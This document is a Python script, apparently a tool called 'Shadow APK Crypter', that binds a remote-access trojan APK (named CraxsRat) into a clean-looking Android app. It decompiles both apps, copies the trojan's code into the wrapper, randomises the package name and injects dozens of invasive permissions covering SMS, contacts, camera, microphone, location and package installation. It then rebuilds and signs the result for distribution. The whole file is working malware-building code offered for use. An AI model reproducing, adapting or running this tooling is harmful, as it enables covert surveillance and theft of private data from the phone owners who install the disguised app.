import os
import shutil
import subprocess
import random
import string
import base64
from colorama import Fore, Style

APKTOOL = "tools/apktool.jar"
SIGNER = "tools/uber-apk-signer.jar"
KEYSTORE = "tools/keystore.jks"
AAPT2 = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Android", "Sdk", "build-tools", "33.0.0", "aapt2.exe")

def banner():
    print(Fore.RED + """
     ███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
     ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
     ███████╗███████║███████║██║  ██║█████╔╝ 
     ╚════██║██╔══██║██╔══██║██║  ██║██╔═██╗ 
     ███████║██║  ██║██║  ██║██████╔╝██║  ██╗
     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
          Shadow APK Crypter – HellGate v2.0
          [🔥] Level 999999 Encryption [🔥]

     Website: https://www.shadowhackr.com/
     Facebook: https://www.facebook.com/Tareq.DJX/
     moPDF: https://www.mopdf.com/

     © 2024 Shadow Hacker. All rights reserved.
    """ + Style.RESET_ALL)

def run(cmd):
    print(Fore.YELLOW + f"[RUN] {cmd}" + Style.RESET_ALL)
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(Fore.RED + f"[ERROR] {result.stderr}" + Style.RESET_ALL)
        return False
    return True

def generate_random_package():
    chars = string.ascii_lowercase
    return f"com.{''.join(random.choice(chars) for _ in range(8))}.{''.join(random.choice(chars) for _ in range(8))}"

def decompile_apks(wrapper, payload):
    print(Fore.CYAN + "[*] Decompiling APKs..." + Style.RESET_ALL)
    if not run(f"java -jar {APKTOOL} d -f {wrapper} -o tmp/wrapper"):
        return False
    if not run(f"java -jar {APKTOOL} d -f {payload} -o tmp/payload"):
        return False
    return True

def inject_payload():
    print(Fore.CYAN + "[*] Injecting payload..." + Style.RESET_ALL)
    
    # Copy payload smali files
    src = "tmp/payload/smali"
    dest = "tmp/wrapper/smali"
    if not os.path.exists(src):
        print(Fore.RED + f"[ERROR] Source directory {src} does not exist" + Style.RESET_ALL)
        return False
    if not os.path.exists(dest):
        os.makedirs(dest)
    
    # Copy all smali files recursively
    for root, dirs, files in os.walk(src):
        for file in files:
            if file.endswith('.smali'):
                src_path = os.path.join(root, file)
                rel_path = os.path.relpath(src_path, src)
                dest_path = os.path.join(dest, rel_path)
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy2(src_path, dest_path)
    
    return True

def fix_manifest():
    print(Fore.CYAN + "[*] Fixing AndroidManifest.xml..." + Style.RESET_ALL)
    manifest_path = "tmp/wrapper/AndroidManifest.xml"
    if not os.path.exists(manifest_path):
        print(Fore.RED + f"[ERROR] Manifest file {manifest_path} does not exist" + Style.RESET_ALL)
        return False
    
    with open(manifest_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Remove problematic attributes
    content = content.replace('android:allowCrossUidActivitySwitchFromBelow="false"', '')
    content = content.replace('android:allowCrossUidActivitySwitchFromBelow="true"', '')
    
    # Generate new package name
    new_package = generate_random_package()
    content = content.replace('package="com.facebook.lite"', f'package="{new_package}"')
    
    # Add necessary permissions
    permissions = [
        '<uses-permission android:name="android.permission.INTERNET"/>',
        '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
        '<uses-permission android:name="android.permission.READ_SMS"/>',
        '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
        '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
        '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
        '<uses-permission android:name="android.permission.CAMERA"/>',
        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
        '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
        '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
        '<uses-permission android:name="android.permission.SEND_SMS"/>',
        '<uses-permission android:name="android.permission.CALL_PHONE"/>',
        '<uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>',
        '<uses-permission android:name="android.permission.READ_CELL_BROADCASTS"/>',
        '<uses-permission android:name="android.permission.READ_PRECISE_PHONE_STATE"/>',
        '<uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>',
        '<uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>',
        '<uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>',
        '<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>',
        '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
        '<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>',
        '<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>',
        '<uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>',
        '<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>',
        '<uses-permission android:name="android.permission.USE_EXACT_ALARM"/>',
        '<uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>',
        '<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>',
        '<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>',
        '<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>',
        '<uses-permission android:name="android.permission.GET_TASKS"/>',
        '<uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>',
        '<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>',
        '<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>',
        '<uses-permission android:name="android.permission.DUMP"/>',
        '<uses-permission android:name="android.permission.READ_LOGS"/>',
        '<uses-permission android:name="android.permission.SET_DEBUG_APP"/>',
        '<uses-permission android:name="android.permission.SET_PROCESS_LIMIT"/>',
        '<uses-permission android:name="android.permission.SET_ALWAYS_FINISH"/>',
        '<uses-permission android:name="android.permission.SIGNAL_PERSISTENT_PROCESSES"/>',
        '<uses-permission android:name="android.permission.FORCE_BACK"/>',
        '<uses-permission android:name="android.permission.BATTERY_STATS"/>',
        '<uses-permission android:name="android.permission.DEVICE_POWER"/>',
        '<uses-permission android:name="android.permission.FACTORY_TEST"/>',
        '<uses-permission android:name="android.permission.RETRIEVE_WINDOW_CONTENT"/>',
        '<uses-permission android:name="android.permission.SET_ANIMATION_SCALE"/>',
        '<uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>',
        '<uses-permission android:name="android.permission.SET_TIME"/>',
        '<uses-permission android:name="android.permission.SET_TIME_ZONE"/>',
        '<uses-permission android:name="android.permission.SET_WALLPAPER"/>',
        '<uses-permission android:name="android.permission.SET_WALLPAPER_HINTS"/>'
    ]
    
    # Add permissions after the manifest tag
    manifest_tag = content.find('<manifest')
    if manifest_tag != -1:
        manifest_end = content.find('>', manifest_tag) + 1
        content = content[:manifest_end] + '\n'.join(permissions) + content[manifest_end:]
    
    with open(manifest_path, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return True

def rebuild_apk():
    print(Fore.CYAN + "[*] Rebuilding APK..." + Style.RESET_ALL)
    # Set aapt2 path for apktool
    os.environ["APKTOOL_AAPT2"] = AAPT2
    return run(f"java -jar {APKTOOL} b tmp/wrapper -o output/unsigned.apk")

def sign_apk():
    print(Fore.CYAN + "[*] Signing APK..." + Style.RESET_ALL)
    if not os.path.exists("output/unsigned.apk"):
        print(Fore.RED + "[ERROR] Unsigned APK not found" + Style.RESET_ALL)
        return False
    
    if os.path.exists(KEYSTORE):
        return run(f"java -jar {SIGNER} -a output/unsigned.apk --ks {KEYSTORE} --ksAlias androiddebugkey --ksPass android --ksKeyPass android")
    else:
        return run(f"java -jar {SIGNER} -a output/unsigned.apk")

def clean():
    print(Fore.CYAN + "[*] Cleaning up..." + Style.RESET_ALL)
    shutil.rmtree("tmp", ignore_errors=True)
    shutil.rmtree("output", ignore_errors=True)

if __name__ == "__main__":
    banner()
    clean()
    os.makedirs("tmp", exist_ok=True)
    os.makedirs("output", exist_ok=True)

    wrapper = "libs/CleanApp.apk"
    payload = "payloads/CraxsRat.apk"

    if not decompile_apks(wrapper, payload):
        exit(1)
    
    if not inject_payload():
        exit(1)
    
    if not fix_manifest():
        exit(1)
    
    if not rebuild_apk():
        exit(1)
    
    if not sign_apk():
        exit(1)

    print(Fore.GREEN + "\n[✓] APK جاهز في: output/unsigned-aligned-signed.apk" + Style.RESET_ALL) 